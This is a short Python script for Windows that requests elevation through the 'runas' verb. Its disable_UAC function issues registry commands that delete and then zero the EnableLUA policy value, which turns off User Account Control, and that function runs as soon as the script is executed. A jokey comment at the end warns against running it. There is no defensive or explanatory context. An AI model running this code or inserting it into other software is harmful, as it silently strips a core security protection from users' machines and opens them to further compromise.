import os
import sys
import ctypes
import win32com.shell.shell as win32shell


def forceAdmin():
    try:
         isAdmin =  ctypes.windll.shell32.IsUserAnAdmin()
    except:
        isAdmin =  False
    
    if not isAdmin:
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except:
           exit(1)
       

def disable_UAC():
    command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
    win32shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command1)
    command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
    win32shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command2)

#forceAdmin()
disable_UAC()

##dont run this code :) rl annoying piece of code